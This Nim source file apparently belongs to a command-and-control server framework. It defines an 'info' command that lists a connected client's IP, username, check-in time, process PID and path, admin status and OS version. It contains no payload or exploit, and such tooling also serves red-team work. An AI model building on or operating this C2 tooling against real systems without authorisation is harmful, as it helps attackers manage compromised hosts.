import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient: 
    if not client.loaded:
      echo $client
    else:
      echo $client & "\n\t" & 
        "IP: " & client.ipAddress & "\n\t" &
        "Username: " & client.username & "\n\t" &
        "Last Checkin: " & client.get_last_checkin() & "\n\t" &
        "Process PID: " & $client.pid & "\n\t" &
        "Process Path: " & client.pname & "\n\t" &
        (if client.osType != WindowsOS: "Running as admin: " & $client.isAdmin & "\n\t" else: "") &
        "OS: " & $client.osType & (
          case client.osType:
          of WindowsOS: "\n\tWindows Version: " & $client.windowsVersionInfo
          else: ""
        ) 

let cmd*: Command = Command(
  execProc: execProc,
  name: "info",
  argsLength: 0,
  usage: @["info"],
  cliMode: @[ClientInteractMode],
  description: "Get more info about a client",
  category: CCClientInteraction
)